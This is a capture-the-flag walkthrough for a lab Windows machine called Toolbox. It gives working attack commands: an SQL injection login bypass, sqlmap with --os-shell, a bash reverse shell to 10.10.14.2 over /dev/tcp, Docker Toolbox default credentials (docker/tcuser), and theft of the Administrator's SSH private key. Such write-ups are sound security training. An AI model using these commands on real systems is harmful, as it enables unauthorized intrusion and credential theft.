@@ -1,0 +1,94 @@
+Toolbox
+
+19th February 2019 / Document No. D21.101.169
+Prepared By: MinatoTW
+Machine Author(s): MinatoTW
+Difficulty: Easy
+Classification: Official
+Synopsis
+
+Toolbox is an easy difficulty Windows machine that features a Docker Toolbox installation. Docker
+Toolbox is used to host a Linux container, which serves a site that is found vulnerable to SQL
+injection. This is leveraged to gain a foothold on the Docker container. Docker Toolbox default
+credentials and host file system access are leveraged to gain a privileged shell on the host.
+
+Skills Required
+
+      Basic Web Knowledge
+
+Skills Learned
+
+      Leveraging PostgreSQL SQL Injection for RCE
+      Docker Toolbox Exploitation
+Enumeration
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.236 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.236
+
+Nmap output shows that ports 21 (FTP), 22 (SSH), 135 (RPC), 139 (NetBIOS), 443 (Apache), 445
+(SMB) and 5985 (Windows Remote Management) are available. This is a Windows machine, but
+the Apache server is is detected as running on a Debian server. This indicates that some kind of
+virtualization / containerization is at play here.
+Nmap output also reveals that the FTP server is configured for anonymous access. First, add a
+firewall rule allowing the target machine to connect to us (in case passive mode transfers are
+enabled).
+Anonymous login is successful, and a file named docker-toolbox.exe is visible. It's possible that
+the server is running Docker Toolbox to host containers.
+Browsing to port 443 (https//:), we come across a SSL certificate issue. Accept the warning and
+proceed to the website.
+
+A website for the company MegaLogistics is found to be hosted, as also shown on the Nmap
+output. Examination of the SSL certificate reveals that the certificate is valid for the FQDN
+admin.megalogistic.com .
+
+Add this entry to the /etc/hosts file and navigate to this vhost.
+A different website featuring an admin login page is visible. After trying various simple SQL
+injection payloads, it's found that authentication can be bypassed with the username admin' or
+1=1 -- .
+
+This allows us to gain access to the administrator dashboard.
+Let's feed the login request to sqlmap and see if we can enumerate the database using the
+injection. First, return to the login page and intercept the request in Burp.
+
+Then right-click in the request window and select Copy to file .
+Then issue the following command to configure sqlmap to use the HTTP request.
+   sqlmap -r toolbox.req --risk=3 --level=3 --batch --force-ssl
+
+Sqlmap leveraged the injection to identify that the back-end database is PostgreSQL.
+Foothold
+
+It's possible to achieve code execution on PostgreSQL using the --os-shell option.
+   sqlmap -r toolbox.req --risk=3 --level=3 --batch --force-ssl --os-shell
+
+Let's execute a bash reverse shell to gain foothold on the server.
+   bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'
+
+A shell as the postgres user is received on the container, and the user flag is found in their
+home folder.
+Privilege Escalation
+
+Docker Toolbox uses VirtualBox to run a VM that houses all the containers. This is achieved using
+the Boot2Docker distribution on VirtualBox. Looking at the documentation, the default
+credentials are found to be docker / tcuser . The Docker host is always present at the gateway
+IP address.
+
+The IP address of the container is 172.17.0.2 , which means that the Docker host VM is at
+172.17.0.1 . Let's try to SSH into it using the default credentials. Before using SSH, we'll have to
+spawn an interactive TTY shell using Python.
+
+   python3 -c 'import pty; pty.spawn("/bin/bash")'
+   ssh docker@172.17.0.1
+
+We were able to logon to the Docker VM. According to the documentation, docker-toolbox has
+access to the C:\Users folder by default, which is mounted at /c/Users .
+
+Looking in the Administrator folder, we find a .ssh folder to be present.
+This folder contains a private SSH key that can be used to login to the main host as Administrator.
+Copy this key and paste it into a file. Give it appropriate 600 permissions and login as
+administrator.
+
+   ssh administrator@10.10.10.236 -i id_rsa
+
+The final flag can be found on the Administrator's desktop.
+
